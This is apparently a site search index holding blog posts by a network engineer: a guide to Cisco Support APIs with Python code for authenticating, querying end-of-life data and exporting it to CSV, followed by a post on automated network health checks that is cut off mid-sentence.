{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"2021/01/31/2021-01-31-welcome/","title":"2021 01 31 welcome","text":"<p>Welcome to my site! I'm looking forward to sharing all sorts of exciting posts on networking technologies and automation. I have a particular interest in SD-WAN, security, and automation with python.</p> <p>Stay tuned for up-coming posts, and any feecback you may have would be greatly appreciated!</p>"},{"location":"2021/02/01/a-guide-to-cisco-support-apis---part-1/","title":"A Guide to Cisco Support API's - Part 1","text":"<p>Managing your network infrastructure hardware, software and maintenance lifecycle workflow tends to be a painful process. It means gathering large amounts of telemetry from your network devices, transforming that data into a format (excel, csv, etc) that you can use to compare, update, and track and then determine the actions you need to take. A year later you get to wash-rinse-repeate the whole process over again. If you are fortunate enough to have a configuration management database (CMDB), this becomes easier, but often these applications require some level of manual effort to keep up-to-date. They can also cost you financially, sometimes more than you are willing or able to pay.</p> <p>In come Cisco's Support API's, enabling you to take over the reins and have a little more flexibility in how you manage your Cisco inventory. In part 1 of this series of posts I provide an overview of how you can use these API's on your own or your customers networks. Part 2 of this series looks to provide a few Python snippets showing how to interact with the API's. For a detailed guide, refer to Cisco's Support API Docs.</p> <p>Note</p> <p>Cisco Support API's enable you to be flexible and agile on what you want to report while also considering your business context that other off-the-shelf applications are unable to comprehend.</p>","tags":["Cisco","API","Automation"]},{"location":"2021/02/01/a-guide-to-cisco-support-apis---part-1/#cisco-support-api-use-cases","title":"Cisco Support API Use-Cases","text":"<p>Before going into detail on the API's, its useful to understand why you might want to use them in the first place. I have been using these API's for a number of reasons including:</p> <ul> <li>Hardware life-cycle planning</li> <li>Reporting for Cisco maintenance renewals</li> <li>Bug scrubs on existing and future software versions</li> <li>Identifying recommended software versions</li> </ul> <p>Note</p> <p>Automating reporting and analysis tasks allows you to provide low level-of-effort (LoE) high-value services to your customers on a more frequent and recurring basis.</p> <p>Yes, all of these tasks can be done manually but when you need to do this at scale across multiple large environments with a wide variety of hardware models and software versions in use, doing so manually becomes very time consuming. These API's have allowed me to provide low LoE value-add services to my customers by decreasing the amount of time spent preparing a recommendation which a customer may or may not be able to move foward with. The customer gets a nice detailed report that they can use in the future and there is a chance that I may get a rewarding project from them to perform a hardware or software life-cycle across their environment. No matter the outcome, your relationship with your customers will be enhanced by providing them with this information.</p>","tags":["Cisco","API","Automation"]},{"location":"2021/02/01/a-guide-to-cisco-support-apis---part-1/#cisco-support-api-introduction","title":"Cisco Support API Introduction","text":"<p>For Cisco customers with Smart Net Total Care (SNTC) or partners with Partner Support Services (PSS), gaining access to Cisco's Support API's is as simple as registering your application/script on Cisco's API console. There are currently eight API end-points that you are able to interface with:</p> <ul> <li>Automated Software Distribution</li> <li>Bug</li> <li>Case</li> <li>EoX</li> <li>Product Information</li> <li>Serial Number to Information</li> <li>Service Order Return (RMA)</li> <li>Software Suggestion</li> </ul> <p>When you register an application you pick which of the above API end-points you would like to associate with the application. If you have multiple applications or scripts you are developing it might be beneficial to create an unique application in the API console for each. Each application you register will have rate limits applied to each (ex. 10 calls per second, 5000 calls per day) Creating multiple applications in the API console for each application you are developing helps ensure you have the necessary resources for each.</p> <p>You will also need to pick an authentication credential type that your application will use to login to the API console. Cisco uses OAuth2.0 credentials and has four grant types available. I personally use the <code>Client Credentials</code> grant type which provides you with a Client ID and Client Secret. Think of these as your username and password. These will be used to authenticate you against the API console and will provide back an access token for you to query each API end-point. More detail on the authentication workflow will be found in Part 2 of this series.</p> <p>Warning</p> <p>Keep your keys in a secure location just like you would any other username/password you use. These keys are associated with your Cisco CCO account. You should not expose your keys to your applications end users, you should not store these directly in your source code or version control, and instead should use environment variables or some other secure mechanism for storing and consuming your API keys (ex. AWS KMS).</p> <p>After registering your application you will be sent an email with your client ID, or you can get your client ID and secret right from the API console by clicking on your application.</p>","tags":["Cisco","API","Automation"]},{"location":"2021/02/01/a-guide-to-cisco-support-apis---part-1/#cisco-support-api-end-point-best-practices","title":"Cisco Support API End-point Best Practices","text":"<p>Okay so at this point you have registered your application, have your client ID and secret, and are now exploring the available API end-points to see what data you can report on. This section won't cover the details about each API end-point (examples will be provided in part 2), but instead will highlight a few things to keep in mind when interacting with the API's.</p> <p>Most of the API's will support returning data in JSON format, but a few also provide XML responses. I personally prefer JSON as Python has a few packages that will easily convert JSON into a dictionary, and JavaScript can easily convert it into an object.</p> <p>Note</p> <p>Play nice with Cisco's API's by rate limiting and reducing unecessary queries.</p> <p>Because you are rate limited on the number of calls per second you can make, I often include a sleep timer of 0.5s between API calls. If you let your application run wide open you will start receiving error responses and timeouts. Play nice with Cisco's API's - rate limit directly within your applications so you don't abuse this great service.</p> <p>On the same front around rate limiting, you are limited to the number of requests you can place per day. Most API end-points allow you to include multiple items in each request. As an example the EoX by Product ID's (PID's) API allows you to include up to 20 PID's per request. Remember, each router can have multiple pieces of hardware installed in it (check with a <code>show inventory</code>). A chassis PID of ISR4451/K9, a module PID of NIM-4MFT-T1/E1, another module of PID ISR4451-X-4x1GE, and possibly more. Instead of sending three API calls (one for each PID), you can group these together in a comma seperated string so that you only have a single API call. Additionally, I usually deduplicate things like the hardware PID's discovered across the entire environment I am reporting on. If you have a dozen Cisco ISR4451/K9's in your environment, you are using you your API call quota and Cisco's resources by querying for the same PID multiple times. Part 2 will show you an example on how to do this deduplication.</p>","tags":["Cisco","API","Automation"]},{"location":"2021/02/01/a-guide-to-cisco-support-apis---part-1/#cisco-psirt-openvuln-api","title":"Cisco PSIRT openVuln API","text":"<p>While not a Support API, Cisco does offer access to their PSIRT openVuln API. I find this worth mentioning because this can be a valuable tool for you to include in automations you may be creating. If you are already reporting on bugs associated with current software images that are in-use in an environment, including security advisory reviews as part of your software analysis can siginificantly help drive value for your customers.</p> <p>I won't be expanding on this API in this post, but may create a post in the future.</p>","tags":["Cisco","API","Automation"]},{"location":"2021/02/01/a-guide-to-cisco-support-apis---part-1/#next-steps","title":"Next Steps","text":"<p>I hope that this post has been informative for you. I have found Cisco's Support API's to be helpful in driving value for my customers and I'm exciting to create a more technical post with some Python examples. Part 2 of this series should be live in a few days.</p> <p>I am a strong believer in learning from others experiences. If you have been using Cisco's API's, I would really like to hear how you have used them and what value the provided you. Feel free to discuss on the social media links above!</p>","tags":["Cisco","API","Automation"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/","title":"A Guide to Cisco Support API's - Part 2 - EoX","text":"<p>The Cisco Support API's provide some very useful end-points that enable you to gain efficiencies on managing your Cisco hardware and software inventory. In this post I present the use of the End of Life (EoX) API that allows you to identify end-of-life equipment within your environment. The code snippets below will be written in in Python and closely follows my Cisco Support API Query Repo on GitHub. Feel free to clone the repo, I intend to include more API end-points in the near future.</p> <p>For a more general overview of the Cisco Support API's refer to part 1 of this series.</p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#what-is-the-eox-api-and-why-use-it","title":"What is the EoX API and why use it?","text":"<p>End-of-life hardware and software in an environment can be a risk to any organization. A vendor who has declared a particular model of hardware or version of software is no longer going to permit you to RMA that hardware if it fails and they may decide to no longer create patches for software versions. This leaves you susceptible to hardware failures which you can't easily replace, or dangerous security risks in software that is not getting patched.</p> <p>The Cisco EoX API allows you to quickly obtain end-of-life information, by passing to the API as URL parameters your Product ID's (PID's), serial numbers, or software release strings. There are end-points for each of these as well as a more general API end-point for querying for EoX information in a specified date range. You can reference Cisco's EoX API documentation for complete details on their use.</p> <p>Here are a few notes on my experience working with these API end-points so far:</p> <ul> <li>I find the Get EoX by Product ID's end-point to be the most useful. It allows you to query up to 20 PID's at a time which helps reduce the number of GET requests you send, which keeps you within your daily query limits</li> <li>Make sure that you deduplicate the PID's, Serial Numbers, or Software Release strings so you can be more efficient in your querying</li> <li>If you query the API end-points too quickly your requests will be blocked by Cisco's rate limiter. Always include a sleep function of at 0.5 seconds so that you don't overwhelm Cisco's API service</li> </ul>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#example-get-eox-by-product-ids","title":"Example: Get EoX by Product ID's","text":"<p>This example is going to provide an overview of querying Cisco's EoX API end-point Get EoX by Product ID's. These details are pulled from my Cisco Support API Query Repo which also includes an example.py to show an easy way of using my utility functions.</p> <p>Note</p> <p>Before you begin make sure that you have registered your application with Cisco's API console and have a valid Client Key and Client Secret with a grant-type of client credentials. Cisco outlines application registration in more detail if you need an overview</p> <p>We will break this exampledown into a few steps:</p> <ol> <li>Install required modules</li> <li>Authenticate with Cisco's API service</li> <li>Query the EoX API</li> <li>Save the EoX records to a CSV file</li> </ol>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#1-install-required-modules","title":"1. Install Required Modules","text":"<p>The main Python module that we will be using to interact with Cisco's API's will be the Requests package. This module is easy to use and I believe wraps the lower-layer urllib3 module. Requests allows you to send various HTTP requests (POST, GET, UPDATE, DELETE, etc) as well as provide URL headers and parameters. Response data from API's like what Cisco offers often return data represented in XML or JSON, and the Requests module allows us to easily convert JSON data into a Python dictionary for our analysis. I will not be covering the Requests module in detail so I encourage you to explore the link above if you are curious.</p> <p>Copy the requirements.txt file from the repo and install the pacakges. <pre><code>pip3 install -r requirements.txt\n</code></pre></p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#2-authenticate-with-ciscos-api-service","title":"2. Authenticate with Cisco's API Service","text":"<p>Cisco's API's use token-based authentication when sending queries. This requires you to first authenticate against Cisco's API service using your client key and secret and if successful you will be provided with an authentication token which you can use in subsequent queries to Cisco API end-points that your application is registered for. The auth token that you are provided is good for 3600 seconds (60 minutes) which in all of my use-cases is more than sufficient.</p> <p>My api_login.py script is more detailed, so this will be slimmed down version from the Python interpreter.</p> <p>The following code is what we will work off of with a detailed explanation below. <pre><code>import time\nimport requests\n\nclass ApiLogin():\ndef **init**(self, client_key: str, client_secret: str) -&gt; None:\nself.client_key = client_key\nself.client_secret = client_secret\nself.login()\n\n    def login(self) -&gt; None:\n        self.auth_token = None\n        self.auth_start = time.time()\n        SSO_URL = 'https://cloudsso.cisco.com/as/token.oauth2'\n\n        params = {\n            'grant_type': 'client_credentials',\n            'client_id': self.client_key,\n            'client_secret': self.client_secret,\n        }\n\n        req = requests.post(\n            SSO_URL,\n            params=params,\n            timeout=10,\n        )\n        req.raise_for_status()\n\n        self.auth_resp = req.json()\n\n        self.auth_token = \\\n            f\"{self.auth_resp['token_type']} {self.auth_resp['access_token']}\"\n\n    def auth_still_valid(self) -&gt; None:\n        if (time.time() - self.auth_start) &gt;= (self.auth_resp['expires_in']):\n            # Login again, which will set a self.url_headers with a new token\n            self.login()\n</code></pre></p> <p>What we are doing here is creating a Python class called ApiLogin and its __init__ function at line 5 requires two parameters; your client_key and client_secret. Upon instantiating a class and passing in client_key and client_secret arguments the <code>login()</code> function will immediately be called at line 8.</p> <p>Once <code>login()</code> has been called it sets the current time with <code>self.auth_start = time.time()</code>. This will be later used to determine if our authentication token has expired.</p> <p>To query the Cisco API login service we perform the following:</p> <ol> <li>We set the URL to <code>https://cloudsso.cisco.com/as/token.oauth2</code> which is used for Cisco's API login service</li> <li>The URL parameters are set in a Python dictionary called <code>params</code> at line 15 which sets the grant_type (we hard code this to <code>client_credentials</code>) along with our client key and client secret. Note that you have to use the keys <code>grant_type</code>, <code>client_id</code> and <code>client_secret</code>, as this is what Cisco's API login service requires</li> <li>We are now ready to send our HTTP POST request using the Requests module at line 21. There are multiple arguments you can provide when using <code>requests.post()</code> but here we simply need to provide the URL to query and the URL parameters previously set</li> <li>After sending the Post requests we test to confirm if the HTTP request was successful. This is accomplished using <code>req.raise_for_status()</code> which is a function the Requests module provides to us and it raises an HTTPError exception if an HTTP 4XX or 5XX response is received meaning that we either didn't authenticate correctly or the server experienced an issue. Here is an example of the complete authentication response (the access token is obfuscated for obvious reasons). You can see that you are given an access_token, token_type and expires_in values</li> </ol> <pre><code>&gt;&gt;&gt; api.auth_resp\n{'access_token': 'AAABBBCCCDDDEEEFFFGGG', 'token_type': 'Bearer', 'expires_in': 3599}\n</code></pre> <ol> <li>If no error was received we can access the response data by assigning the JSON response to a python dictionary using the <code>resp.json()</code> function call. We assign this to our variable <code>self.auth_resp</code> for us to use at line 30 by assigning the <code>access_type</code> and <code>access_token</code> key values to <code>self.auth_token</code>.</li> <li>Finally, a function called <code>auth_still_valid()</code> is defined which takese the compares the current time, <code>self.auth_start</code> and <code>self.auth_resp['expires_in']</code> to determine if the token has expired or not. If it has, it calles <code>login()</code> again to obtain a new token</li> </ol> <p>So how would you use this class?</p> <pre><code>&gt;&gt;&gt; from dotenv import dotenv_values\n&gt;&gt;&gt; from util.api_login import ApiLogin\n&gt;&gt;&gt; client_key = dotenv_values('.env')['CLIENT_KEY']\n&gt;&gt;&gt; client_secret = dotenv_values('.env')['CLIENT_SECRET']\n&gt;&gt;&gt; api = ApiLogin(client_key, client_secret)\n&gt;&gt;&gt; api.auth_token\n'Bearer AAABBBCCCDDDEEEFFFGGG'\n</code></pre> <p>Warning</p> <p>Keep your API keys in a secure location just like you would any other username/password you use. These keys are associated with your Cisco CCO account. You should not expose your keys to your applications end users, you should not store these directly in your source code or version control, and instead should use environment variables or some other secure mechanism for storing and consuming your API keys (ex. AWS KMS). The above example uses Python's dotenv module which allows you to store environment variables in a file called .env. Ensure that your .gitignore file is configured to ignore this file.</p> <p>The <code>api.auth_token</code> value is what will enable you to initiate subsequent queries against specific Cisco API end-points. The next section describes how we will use this and the response data for the EoX API end-point.</p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#3-query-the-eox-api","title":"3. Query the EoX API","text":"<p>Once you have authenticated with Cisco's API service and have an authentication token you are now ready to query the EoX API end-point. We will be using the Get EoX by Product ID's end-point which allows us to query based on a product ID.</p> <p>This example does not cover how you would obtain all of your product ID's from your entire infrastructure, but I have used a few methods to do so in the past:</p> <ul> <li>Use Python modules such as netmiko and ntc-templates to obtain the output of a \"show version\" and parse it into a Python dictionary with the product ID's and serial numbers</li> <li>Use PySNMP to query a devices entPhysicalEntry table which will contain an assortment of valuable information including your PID's and serial numbers for each</li> <li>Use any other source of information that you have available that describes your inventory and can provide PID's</li> </ul> <p>It is important to note that you should identify EoX information not only on your chassis PID but on all other pieces of hardware that are installed in your device. This includes modules, fans, power supplies, transceivers, etc</p> <p>My api_eox.py script provides a mechanism to query Cisco's Get EoX by Product ID's API end-point, the code is as shown below:</p> <pre><code>from typing import List\nfrom typing import Dict\nimport time\nimport requests\n\nclass ApiEox():\n    def __init__(self, auth_token: str, mime_type: str = 'application/json') -&gt; None:\n        self.url_headers = {\n        'Accept': mime_type,\n        'Authorization': auth_token,\n        }\n        self.items = []\n        self.records = []\n\n    def __send_query(self, url: str,) -&gt; Dict:\n        req = requests.get(\n            url,\n            headers=self.url_headers,\n            timeout=10,\n        )\n        req.raise_for_status()\n        return req.json()\n\n    def query_by_pid(self, pids: List[str]) -&gt; None:\n        BLACK_LIST = ['', 'n/a', 'b', 'p', '^mf', 'unknown',\n                      'unspecified', 'x']\n        MAX_ITEMS = 20\n        self.items = list({pid for pid in pids if pid.lower() not in BLACK_LIST})\n        API_URL = 'https://api.cisco.com/supporttools/eox/rest/5/EOXByProductID/{}/{}'\n\n        start_index = 0\n        end_index = MAX_ITEMS\n        while start_index &lt;= len(self.items) - 1:\n            page_index = 1\n            pagination = True\n            while pagination:\n                url = API_URL.format(\n                    page_index,\n                    (',').join(self.items[start_index:end_index])\n                )\n                resp = self.__send_query(url)\n\n                if resp.get('EOXRecord'):\n                    self.records = self.records + resp['EOXRecord']\n\n                if page_index &gt;= resp['PaginationResponseRecord']['LastIndex']:\n                    pagination = False\n                else:\n                    page_index += 1\n\n                # Play nice with Cisco API's and rate limit your queries\n                time.sleep(0.5)\n\n            start_index = end_index\n            end_index += MAX_ITEMS\n</code></pre> <p>This code creates a class named <code>ApiEox()</code> which allows us to query the EoX API multiple times and store the returned records in <code>self.records</code> for future reference. It includes a few other tricks like blacklisting certain PID's, deduplicating the list of PID's and controlling pagination of the returned records and reading the.</p> <p>Looking at the code in more detail we see:</p> <ol> <li>The <code>\\__init__</code> function accepts our auth_token we received in our ApiLogin() class, a MIME Type (we default by setting this to application/json but you can also use XML). These parameters are stored in the <code>self.url_headers</code> dictionary which will be used as part of our Requests.GET call later on</li> <li>At lines 12 and 13 we declare <code>self.items</code> which will be used to store the list of PID's, and <code>self.records</code> which will store the returned EOXRecords that the API sends us</li> <li>The <code>__send_query</code> function is an internal class function that controls sending the HTTP request and returns the response. The details of this is covered in more detail in step 2 above for logging in to the Cisco API service</li> <li>The bulk of our code is handled in the <code>query_by_pid()</code> function at line 23 which accepts a single parameter; a list of PID's</li> <li>I have defined a BLACK_LIST which is a list of unacceptable PID's at line 24. Based on experience in how I have gathered inventory data from parsing \"show version\" or querying for the SNMP table of entPhysicalEntry there tends to be a few values returned in the PID column that are irrelevant</li> <li>At line 28 I use a Python set comprehension which assigns the PID's to our previously declared <code>self.items</code> variable list and performs two things for me:</li> <li>It deduplicates the list of PID's that were provided, so we don't query Cisco's API for the same item twice (ex. you may have multiple Cisco ISR4321/K9, so why query for the same information more than once)</li> <li>I am able to compare each PID against my BLACK_LIST variable and discard it if its in the list</li> <li>We declare the API_URL for the Get EoX by Product ID at line 29</li> <li>Because you can query up to a maximum of 20 PID's in a single HTTP GET request to the API by comma seperating the PID's in the URL you are calling I accomplish this by:</li> <li>Declaring a <code>start_index</code> of 0 and <code>end_index</code> of our MAX_ITEMS (in this case 20) at lines 31 and 32</li> <li>I then loop through all items for as long as our <code>start_index</code> is less than the length of our <code>self.items - 1</code>. We subtract 1 because Python lists are zero-indexed</li> <li>I then define the URL to use in the query by doing a Python <code>join()</code> at lines 37 through 40. This <code>join()</code> statement will join together the PID's between the list indexes from the start_index up to the end_index (or to the end of the list if there aren't 20 items left), using a comma as a delimiter</li> <li>Skipping down a few lines past the query and response details (discussed in another bullet below) I now increment my start_index and end_index values at lines 54 and 55 so that the next query, if necessary, will include the items in <code>self.items</code> from indexes 20 through 39</li> <li>At line 40 I call our private function <code>__send_query</code> with the URL as an argument and assign the response to the <code>resp</code> variable</li> <li>A response from the Get EoX by Product ID API end-point is a JSON with keys (full API details here) describing the PaginationResponseRecord and the EOXRecord (which can contain multiple records, for all of the PID's you sent in the URL)</li> <li>If an <code>EOXRecord</code> exists in the response I extend our <code>self.records</code> list to include the new records in line 43</li> <li>We previously defined a page_index of 1 at line 34, but now we will review the PaginationResponseRecord to see if there is more than one page describing all of the records by looking at the LastIndex key at line 46. If there are multiple pages, we need to increment our page_index by one and query again. The while loop at line 36 will continue querying until our page_index value is the same as the LastIndex in the response and will then exit the loop</li> <li>Because Cisco's API's only allow so many queries per second and per minute I include a sleep function with <code>time.sleep(0.5)</code> at line 52</li> </ol> <p>So tying this all together we can use this code as follows: <pre><code>&gt;&gt;&gt; from util.api_eox import ApiEox\n&gt;&gt;&gt; eox = ApiEox(api.auth_token)\n&gt;&gt;&gt; pids = ['WS-C3750X-48PF-S', 'C3KX-PWR-1100WAC', ]\n&gt;&gt;&gt; eox.query_by_pid(pids)\n</code></pre></p> <p>We have now queries the API to get EoX information for two PID's. This information is stored in the <code>eox.records</code> class instance variable and is a list with two records: <pre><code>&gt;&gt;&gt; len(eox.records)\n&gt;&gt;&gt; 2\n</code></pre></p> <p>Each record is Python dictionary and has the following keys describing the record: <pre><code>&gt;&gt;&gt; eox.records[0].keys()\n&gt;&gt;&gt; dict_keys(['EOLProductID', 'ProductIDDescription', 'ProductBulletinNumber', 'LinkToProductBulletinURL', 'EOXExternalAnnouncementDate', 'EndOfSaleDate', 'EndOfSWMaintenanceReleases', 'EndOfSecurityVulSupportDate', 'EndOfRoutineFailureAnalysisDate', 'EndOfServiceContractRenewal', 'LastDateOfSupport', 'EndOfSvcAttachDate', 'UpdatedTimeStamp', 'EOXMigrationDetails', 'EOXInputType', 'EOXInputValue'])\n</code></pre></p> <p>A more detailed look at the first record shows that the Product ID of WS-C3750X-48PF-S went end of sale on 2016-10-30 and its last date of support was 2021-10-31 <pre><code>&gt;&gt;&gt; eox.records[0]['EndOfSaleDate']\n&gt;&gt;&gt; {'value': '2016-10-30', 'dateFormat': 'YYYY-MM-DD'}\n&gt;&gt;&gt; eox.records[0]['LastDateOfSupport']\n&gt;&gt;&gt; {'value': '2021-10-31', 'dateFormat': 'YYYY-MM-DD'}\n</code></pre></p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#4-save-the-eox-records-to-a-csv-file","title":"4. Save the EoX records to a CSV file","text":"<p>So you now have the EoX records for all of the hardware within your environment stored in a Python dictionary. You will more than likely need to report on this to those responsible for financial planning, forecasting and coordination of replacing EoX equipment. A simple method would be to save these records to a CSV file which I will show below, but you could get even more advanced by having a report that links each record back to the actual network inventory on a device by device basis.</p> <p>The code to do a simple export to CSV is as follows <pre><code>import csv\n\n#...previous code for logging into the API and obtaining EoX records\n\nFNAME = 'eox_report.csv'\nwith open(FNAME, mode='w') as fhand:\nwriter = csv.writer(fhand, delimiter=',', quotechar='\"',\nquoting=csv.QUOTE_MINIMAL)\nwriter.writerow(['EOLProductID',\n'ProductIDDescription',\n'LastDateOfSupport',\n'EndOfSWMaintenanceReleases',\n'EOXExternalAnnouncementDate',\n'EndOfSaleDate',\n'EndOfSecurityVulSupportDate',\n'EndOfRoutineFailureAnalysisDate',\n'EndOfServiceContractRenewal',\n'EndOfSvcAttachDate',\n'LinkToProductBulletinURL', ])\nfor record in eox.records:\nwriter.writerow([record['EOLProductID'],\nrecord['ProductIDDescription'],\nrecord['LastDateOfSupport']['value'],\nrecord['EndOfSWMaintenanceReleases']['value'],\nrecord['EOXExternalAnnouncementDate']['value'],\nrecord['EndOfSaleDate']['value'],\nrecord['EndOfSecurityVulSupportDate']['value'],\nrecord['EndOfRoutineFailureAnalysisDate']['value'],\nrecord['EndOfServiceContractRenewal']['value'],\nrecord['EndOfSvcAttachDate']['value'],\nrecord['LinkToProductBulletinURL'], ])\n\nprint(f'EOX records written to file {FNAME}')\n</code></pre></p> <p>This code uses the Python CSV's writer() function to loop through each record in eox.records and saves the contents of each record as a new row in that CSV file.</p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#conclusion","title":"Conclusion","text":"<p>Using Cisco's EoX API can help you and your customers by easily identifying which hardware is, or may soon become, end-of-life. You can transform the data in whichever way you wish to create powerful reports!</p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/07/a-guide-to-cisco-support-apis---part-2---eox/#a-note-on-the-get-eox-by-software-release-strings-api-end-point","title":"A note on the Get EoX by Software Release Strings API end-point","text":"<p>The Get EoX by Software Release Strings end-point was trickier to work with because it requires you to enter your software versions using a SWReleaseStringType. This requires you to create a string representing the software version and type together such as \"input1=12.4(15),IOS&amp;input2=16.3.9,IOS-XE\". Depending on how you have transformed your data, this can be more difficult to programmatically create this URL query string.</p> <p>The other difficulty I had in working with this API end-point is I believed it would return end-of-life details on the software versions themselves. Instead, it returned EoX information using a PID as a key such as \"S280IPBK9-12424T=\" which is a representation of running 12.4(24)T on a Cisco 2801 IOS IP Base router. I would have found this much more useful if it returned these as two separate PID's; one indicating 12.4(24)T and another as CISCO2801 so I could more easily compare this against my hardware and software inventory. If anyone has identified a way to use this other PID I would enjoy hearing how they have compared this with their inventory.</p>","tags":["Cisco","API","Automation","Python"]},{"location":"2021/02/10/the-role-of-automated-health-checks/","title":"The Role of Automated Health Checks","text":"<p>The increasing complexity of network infrastructure devices has drastically changed what is required to perform a thorough health check to ensure it is operating correctly and efficiently. Take for example SD-WAN; what used to be a relatively simple health check on a router now requires deeper knowledge of the specific traffic traversing the device. In the past a few checks of system health (CPU, memory, hardware status, interface status and errors, routing changes) has now evolved to also include app-routing and application aware functions (app routes, SLA's, BFD, NetFlow, QoS, among many others). Health checks on a site router can now consume valuable time in driving the incident to resolution. Then take into account all of the devices in a network path between a source and destination, of which many of these devices now include rapidly evolving network technologies, and it becomes a painful battle to beat the clock as your business is being impacted by a critical incident.</p> <p>As network engineers we're used to everyone else saying \"it's the network causing the issue\" and having to painstakenly investigate every component and provide evidence as to whether or not the network is contributing to the issue the users or applications are experiencing. It's not that I don't mind this approach, it certainly makes me a better engineer having prove without a doubt that the network is healthy, but we are always faced with prioritizing which checks we perform first and can sometimes overlook a symptom early on in an investigation as the attendees on a 30 person conference call are asking for minute-by-minute updates. When faced with limited time to perform a task you start to look for a more efficient way; automation.</p> <p>Automation can be a powerful tool and as our understanding and acceptance of the risk versus reward factor increases we will find more ways to incorporate it in our daily lives in network operations. I believe that it can be a low risk and high reward when it comes to health checks and I often have the following goals when creating automated health checks:</p> <ul> <li>An automation should compliment, not replace, our monitoring tools</li> <li>Automate the easy and mundane health checks, so you can focus on the complex aspects</li> <li>Low risk tasks only, nothing dangerous</li> <li>Record a historical snapshot of current state</li> </ul> <p>Note</p> <p>By creating automations to help you during critical incidents you also provide significant value to even low priority incidents. While automations may seem overkill for a low priority and low impacting incident, you may catch an unrelated issue and be able to resolve it before there is noticeable impact to users and services. Because scripts can be executed and completed in less than a few minutes, performing due diligence on these simpler incidents can save your organization in the long run.</p> <p>I hope to cover each of these goals throughout this post to provide some insight into the benefits of automated health checks.</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/10/the-role-of-automated-health-checks/#where-does-aiops-come-in-to-play","title":"Where does AIOps come in to play?","text":"<p>Before diving into my approach to automated health checks I wanted to briefly bring up AIOps (artificial intelligence for IT operations). Any article on automation and health checks would probably be doing itself a diservice without mentioning AIOps. AIOps is the idea of leveraging machine learning (ML) and artificial intelligence (AI) to analyze large data sets to identify trends that may become, or already are, impacting. The ability of ML and AI to parse and correlate data from multiple different sources in realtime is why AIOps is starting to take off. It is used in a few different areas of IT such as security monitoring and application performance monitoring. To be completely honest I don't have any experience with platforms providing AIOps, but I'm excited to see how AIOps will evolve and help us in our roles as network engineers. Even without more complex network platforms being developed, existing platforms contain a large amount of information just waiting for a system to analyze it and provide insights that would be difficult for someone to do manually on a repeated basis.</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/10/the-role-of-automated-health-checks/#monitoring-tools-have-their-place","title":"Monitoring Tools Have Their Place","text":"<p>Automating health checks should not replace your monitoring tools, they should compliment them. Monitoring tools will have a historical perspective that can be very valuable during an investigation, such as performance metrics on interface statistics, CPU/memory utilization, and other events. This historical information should still be used to identify a baseline for what things look like during periods of time where no issues are being experienced. Additionally, monitoring tools can't catch every issue or may miss an event depending on the telemetry used (syslog and SNMP traps can be unreliable during times of network instability). Your health check scripts can be used as a second set of eyes to backup and validate what your monitoring tools are showing you.</p> <p>While many of the health checks that we perform can be done from within your monitoring tools, they don't solve the aspect of saving you a ton of time because you still need to manually load each network element within the monitoring tool and visually validate the status of each aspect of that device. There can be lots of eye candy that distract your eyes from looking at the relevant information, or you need to browse through multiple pages to get the information you need. This is still better than manually pulling all of the information from each network devices CLI or web GUI, as a monitoring tool can have contextual highlighting to indicate what might be an issue.</p> <p>It is very difficult for monitoring tools to build in business context and to understand the intention of each network element. You as the engineer understand that context and can build that into your automated health checks.</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/10/the-role-of-automated-health-checks/#automate-the-easy-and-mundane","title":"Automate the Easy and Mundane","text":"<p>Building out complex logic within a health check script will most likely require a high-level of on-going management and changes to that script as you discover edge cases. Instead, I focus on the top 15 to 20 checks I would perform on a specific device type that are easy to analyze. The following are some examples but note that each of these may have several checks to accomplish the goal of validating the component is operating in a healthy state:</p> <ul> <li>Critical interface status, speed, duplex and errors</li> <li>CPU and memory utilization</li> <li>Hardware health</li> <li>Routing protocol neighbor status (are the neighbors up, and receiving routes/prefixes, have they recently re-converged)</li> <li>Specific route status (ex. is my default-route using the correct next-hop?)</li> <li>High-Availability (HA) status (ex. firewall HA, FHRP's, routing-engines, etc)</li> <li>Recording and displaying the 15 latest high-priority logging messages (ex. syslog severity levels 0 through 2)</li> <li>Checks for any known historical and recurring issues (ex. I'm currently facing a bug on Cisco ENCS devices where a log file fills up and causes some instability)</li> </ul> <p>Note</p> <p>By having a standardized and templated network design that is applied across your organization, it will be far easier to create automated health checks (and even manual health checks!). Introducing one-off configuratons will require your health check scripts to be far more complex and decreases the accuracy of the returned results.</p> <p>Once you have automated these more common health check tasks, you can run these to provide you with feedback within a minutes and know if the device is experiencing any common issues. You can also check more devices at a faster rate than you would ever be able to do manually. And once you know the general status of the network devices in the path between a source and destination you can focus on more complex areas of investigation on those devices if your scripts did not find anything relevant to the incident.</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/10/the-role-of-automated-health-checks/#low-risk-tasks-only-nothing-dangerous","title":"Low Risk Tasks Only, Nothing Dangerous","text":"<p>During a high-impact incident the last thing you want to do is introduce further impact. The health check scripts that I have used don't perform any configuration changes or enable any debugs/traces. These are the more complex tasks that you should be performing manually or letting the network infrastructure directly implement (ex. an SLA failure causing app-aware routing to adjust on a Viptela vEdge device to a more favorable transport).</p>","tags":["Automation","Operations","AIOps"]},{"location":"2021/02/10/the-role-of-automated-health-checks/#historical-snapshot-of-current-state","title":"Historical Snapshot of Current State","text":"<p>Having worked in network operations for the majority of my career I'm quite familiar with having to perform a post-incident review when not having been involved in the original investigation. Often times there can be a lot of debate around whether the appropriate actions were taken and if they were implemented in a timely fashion. Without sufficient data backing up our investigation it can be difficult to identify exactly what the state was during and after an incident. By automating health checks you can log a significant amount of information (ex. CLI output) to file and then record that information in an incident ticket. 